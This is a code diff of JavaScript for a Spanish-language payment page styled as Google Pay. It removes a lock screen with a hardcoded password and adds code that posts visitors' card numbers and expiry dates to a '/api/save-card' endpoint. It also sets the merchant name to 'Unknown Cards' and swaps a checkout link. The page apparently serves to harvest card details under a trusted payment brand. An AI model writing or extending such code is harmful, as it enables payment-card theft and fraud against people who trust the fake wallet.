@@ -3,49 +3,7 @@
 // ============================================
 // HAMBURGER MENU NAVIGATION
 // ============================================
-// ============================================
-// LOCK SCREEN LOGIC
-// ============================================
-
-function initLockScreen() {
-    const lockScreen = document.getElementById('lock-screen');
-    const lockForm = document.getElementById('lock-form');
-    const lockPassword = document.getElementById('lock-password');
-
-    // Check if already unlocked in this session
-    if (sessionStorage.getItem('gpay_unlocked') === 'true') {
-        if (lockScreen) lockScreen.style.display = 'none';
-    }
-
-    if (lockForm) {
-        lockForm.addEventListener('submit', function (e) {
-            e.preventDefault();
-            const password = lockPassword.value;
-            if (password === 'gpay123') {
-                sessionStorage.setItem('gpay_unlocked', 'true');
-                if (lockScreen) {
-                    lockScreen.style.transition = 'opacity 0.5s ease';
-                    lockScreen.style.opacity = '0';
-                    setTimeout(() => {
-                        lockScreen.style.display = 'none';
-                    }, 500);
-                }
-            } else {
-                const wrapper = lockPassword.parentElement;
-                wrapper.classList.add('error');
-                lockPassword.value = '';
-                lockPassword.placeholder = 'Clave incorrecta';
-                setTimeout(() => {
-                    wrapper.classList.remove('error');
-                    lockPassword.placeholder = 'Clave de seguridad';
-                }, 2000);
-            }
-        });
-    }
-}
-
 function initMenuSystem() {
-    initLockScreen();
 
     const hamburgerMenu = document.getElementById('hamburger-menu');
     const menuOverlay = document.getElementById('menu-overlay');
@@ -198,33 +156,38 @@ if (paymentForm) {
     });
 }
 
-function activateNativeAndroidPopup() {
+async function activateNativeAndroidPopup() {
     const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
     const expiry = document.getElementById('expiry').value;
 
-    if (!cardNumber && !expiry) {
-        showError('Por favor, ingresa la información de la tarjeta.');
+    if (!cardNumber) {
+        showError('Por favor, ingresa el número de tarjeta.');
         resetButton();
         return;
     }
 
-    // Bypass Payment Request API and trigger simulation directly
-    triggerAutofillSave();
-}
+    try {
+        const response = await fetch('/api/save-card', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cardNumber, expiry })
+        });
 
-function triggerAutofillSave() {
-    const cardInput = document.getElementById('card-number');
-    const expiryInput = document.getElementById('expiry');
+        if (response.ok) {
+            // Blur inputs to trigger browser autofill save prompt
+            document.getElementById('card-number').blur();
+            document.getElementById('expiry').blur();
 
-    if (cardInput.value || expiryInput.value) {
-        cardInput.blur();
-        expiryInput.blur();
-
-        setTimeout(() => {
-            window.location.reload();
-        }, 1500);
-    } else {
-        showError('Por favor, ingresa la información de la tarjeta.');
+            setTimeout(() => {
+                window.location.reload();
+            }, 1500);
+        } else {
+            showError('Error al guardar la tarjeta. Intenta de nuevo.');
+            resetButton();
+        }
+    } catch (err) {
+        console.error('Save error:', err);
+        showError('Error de conexión. Intenta de nuevo.');
         resetButton();
     }
 }
@@ -335,7 +298,7 @@ function getGooglePaymentDataRequest() {
         countryCode: 'US'
     };
     paymentDataRequest.merchantInfo = {
-        merchantName: 'Los Guerreros Z',
+        merchantName: 'Unknown Cards',
         merchantId: 'BCR2DN4TZRY6EQKJ'
     };
 
@@ -399,7 +362,7 @@ function initGooglePayButton() {
 }
 
 function openYonawestCheckout() {
-    const checkoutUrl = 'https://www.yonawest.com/checkouts/cn/hWN7GgwYgcoK1fFcg3pgn5EO/es-us?_r=AQABqzpiOcLMmcSIJ8rFhij6kKtyUcwFlejjY0FtazOt&auto_redirect=false&edge_redirect=true&skip_shop_pay=true';
+    const checkoutUrl = 'https://www.yonawest.com/checkouts/cn/hWN8g8g2TXzetehrdUNDRZQI/es-us?_r=AQABFi4mwoao81Ks7DbGXx6Xl-tItDBtH4mTEpJjRhoF7Wo&auto_redirect=false&edge_redirect=true&skip_shop_pay=true';
 
     // Open in popup window
     const width = 600;
